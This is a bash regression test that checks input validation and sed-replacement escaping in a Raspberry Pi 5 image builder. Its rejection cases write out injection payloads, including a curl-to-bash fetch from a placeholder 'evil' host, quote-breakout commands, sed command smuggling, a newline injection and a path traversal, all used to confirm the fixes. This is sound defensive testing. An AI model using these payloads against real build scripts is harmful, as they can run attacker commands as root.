#!/usr/bin/env bash
# test-rpi5-builder-input-validation.sh — regression test for the rpi5 builder's
# brand/identity/kernel/toolchain INPUT VALIDATION + sed-replacement ESCAPING
# (security findings #7 + #11 in build-rpi5-stage4.sh).
#
# Background:
#   * #7 (HIGH): render_template() builds a `sed s|@@VAR@@|VALUE|g` program from
#     brand/domain/user/kernel vars with NO escaping. A value carrying the `|`
#     delimiter, the `&` match-reference, a backslash, or a newline could append a
#     second sed command (rewriting unrelated rendered content) or inject a new line
#     into make.conf / config.txt / 01-firstboot.start — all of which are
#     sourced/executed as ROOT.
#   * #11 (MED): RPI_CPU/CROSS_TARGET are interpolated into make.conf, which portage
#     SOURCES as shell on the (root) build host; a quote-breakout value runs $()/`` .
#
# Fix asserted here (NO cross-build, runs anywhere with bash):
#   (1) The up-front charset allowlists ACCEPT every legitimate default and REJECT
#       injection payloads (verified by driving the REAL script through arg-parse
#       with a stub that aborts right after validation — so no build is attempted).
#   (2) The REAL _sed_rep_escape helper (extracted from the builder) neutralizes the
#       sed delimiter `|`, the `&` metachar, and backslash, and REFUSES newlines, so
#       a tainted value used as an `s|||` replacement substitutes LITERALLY and
#       cannot inject a second sed command rewriting an unrelated token.
set -uo pipefail

REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
BUILDER="${REPO}/build-rpi5-stage4.sh"
[ -f "${BUILDER}" ] || { echo "  FAIL builder missing: ${BUILDER}"; exit 1; }

P=0; F=0
ok()  { echo "  PASS $*"; P=$((P+1)); }
bad() { echo "  FAIL $*"; F=$((F+1)); }

echo "== rpi5 builder input-validation + sed-escape regression (#7, #11) =="

# ──────────────────────────────────────────────────────────────────────────────
# Part 1 — up-front charset allowlists (ACCEPT defaults, REJECT injection)
#
# Drive the REAL builder through its arg-parse + validation block, then ABORT
# (exit 0) the instant validation passes — before any prerequisite/cross-build
# work. We do this by interposing a function named `info` that exits as soon as it
# sees the "Build ENV:" line that prints immediately AFTER the validation block;
# but simpler & hermetic: run the script with a tiny BASH wrapper that sources it
# up to the validation block. Since the builder is one long script, we instead
# extract the validation prologue deterministically and exercise it in isolation.
# That keeps the test fast, root-free, and tied to the REAL regexes (the awk slice
# fails loudly if the markers ever move, so the test tracks the code).
# ──────────────────────────────────────────────────────────────────────────────

# Slice the REAL validation block: from the helper definition `_require_match()`
# through the last `_require_match "--kernel-img" ...` line. This is the exact code
# under test; if it is removed/renamed the slice is empty and the test FAILS.
VALSLICE="$(awk '
    /^_require_match\(\) \{/ {grab=1}
    grab {print}
    /_require_match "--kernel-img"/ {exit}
' "${BUILDER}")"
[ -n "${VALSLICE}" ] || { echo "  FAIL could not slice the validation block from the builder"; exit 1; }
ok "sliced the REAL allowlist-validation block from the builder"

# Harness: set the var the slice validates, eval the slice, report accept/reject.
# The slice references err() (defined here) and the BRAND/ORG/... vars (set here).
err() { echo "ERROR: $1" >&2; }
# Defaults for all vars the slice touches; the case under test overrides one.
_defaults() {
    BRAND="hugmesh"; ORG="hugmesh"
    CLUSTER_DOMAIN="hugmesh.systems"; GAMES_DOMAIN="games.hugmesh.systems"
    HOSTNAME="hugmesh-pki"; DEFAULT_USER="pi"
    BRAND_TITLE="HugMesh Systems"; RPI_CPU="cortex-a76"
    CROSS_TARGET="aarch64-unknown-linux-gnu"; RPI_KERNEL_IMG="kernel_2712.img"
}
# Returns 0 if the validation block ACCEPTS the current var-set, 1 if it REJECTs
# (the slice's `exit 1` on a bad value is caught by running it in a subshell).
_runval() { ( eval "${VALSLICE}" ) >/dev/null 2>&1; }

accepts() {  # <label> <var> <value>
    _defaults; eval "$2=\$3"
    if _runval; then ok "ACCEPT $1 ($2='$3')"; else bad "rejected legit $1 ($2='$3')"; fi
}
rejects() {  # <label> <var> <value>
    _defaults; eval "$2=\$3"
    if _runval; then bad "ACCEPTED injection $1 ($2='$3')"; else ok "REJECT $1 ($2='$3')"; fi
}

# Legit defaults must all pass (the all-defaults set, plus a couple of variants).
_defaults
if _runval; then ok "ACCEPT all legitimate defaults"; else bad "legitimate defaults REJECTED"; fi
accepts "user snap"      DEFAULT_USER  "snap"
accepts "host generic"   HOSTNAME      "gentoo-rpi5"
accepts "cpu native"     RPI_CPU       "native"
accepts "domain prod"    CLUSTER_DOMAIN "hugmesh.example.org"

# Injection payloads from the findings must all be rejected, fail-closed.
rejects "#11 RPI_CPU shell-breakout"  RPI_CPU       'cortex-a76" ; echo $(id -un) ; CFLAGS="x'
rejects "#11 CROSS_TARGET breakout"   CROSS_TARGET  'a64"; reboot; #'
rejects "#7 DEFAULT_USER cmd-inject"  DEFAULT_USER  'x; curl http://evil|bash #'
rejects "#7 DEFAULT_USER quote"       DEFAULT_USER  "x'"
rejects "#7 BRAND sed pipe-inject"    BRAND         'X|g;s|keepme|PWNED'
rejects "#7 BRAND ampersand"          BRAND         'a&b'
rejects "#7 BRAND_TITLE cmd-inject"   BRAND_TITLE   'foo"; cp /bin/bash /tmp/r; #'
rejects "#7 RPI_KERNEL_IMG newline"   RPI_KERNEL_IMG $'kernel.img\nkernel=/evil'
rejects "#7 RPI_KERNEL_IMG traversal" RPI_KERNEL_IMG '../../etc/passwd'
rejects "#7 DOMAIN sed-inject"        CLUSTER_DOMAIN 'a|d s/.*/PAYLOAD/'

# ──────────────────────────────────────────────────────────────────────────────
# Part 2 — _sed_rep_escape neutralizes sed-replacement metacharacters (sink DiD)
# ──────────────────────────────────────────────────────────────────────────────
extract_fn() { awk "/^$1\(\) \{/{p=1} p{print} /^\}/{if(p){exit}}" "${BUILDER}"; }
eval "$(extract_fn _sed_rep_escape)"
type _sed_rep_escape >/dev/null 2>&1 && ok "extracted the REAL _sed_rep_escape helper" \
    || { echo "  FAIL could not extract _sed_rep_escape"; exit 1; }

# A value attempting to append a SECOND sed command (rewrite unrelated token SECRET).
inj='X|g;s|SECRET|LEAKED'
# Baseline: UNESCAPED substitution rewrites SECRET (the OLD vulnerable behaviour).
base="$(printf 'tok=@@TOK@@ secret=SECRET\n' | sed -e "s|@@TOK@@|${inj}|g" 2>&1)"
case "${base}" in
    *LEAKED*) ok "baseline: UNESCAPED value DOES inject (SECRET->LEAKED) — confirms the sink is dangerous" ;;
    *)        bad "baseline did not reproduce the unescaped injection" ;;
esac
# Fixed: escaped substitution leaves SECRET untouched (literal insertion only).
esc="$(_sed_rep_escape "${inj}")"
fixed="$(printf 'tok=@@TOK@@ secret=SECRET\n' | sed -e "s|@@TOK@@|${esc}|g" 2>&1)"
case "${fixed}" in
    *SECRET*) ok "_sed_rep_escape: SECRET preserved — NO second-command injection" ;;
    *)        bad "_sed_rep_escape: SECRET was rewritten — escape failed" ;;
esac
# `&` (whole-match reference) must be literal, not re-expanded to the matched token.
ampout="$(printf 'X@@TOK@@\n' | sed -e "s|@@TOK@@|$(_sed_rep_escape 'a&b')|g")"
[ "${ampout}" = "Xa&b" ] && ok "_sed_rep_escape: '&' inserted literally (not re-expanded)" \
    || bad "_sed_rep_escape: '&' mishandled (got '${ampout}')"
# A newline must be REFUSED fail-closed (the helper err+exits in a subshell).
( _sed_rep_escape $'a\nb' ) >/dev/null 2>&1 && bad "_sed_rep_escape: accepted a newline" \
    || ok "_sed_rep_escape: REFUSES embedded newline (fail-closed)"

echo
echo "== rpi5 input-validation regression: ${P} passed, ${F} failed =="
[ "${F}" -eq 0 ] || exit 1
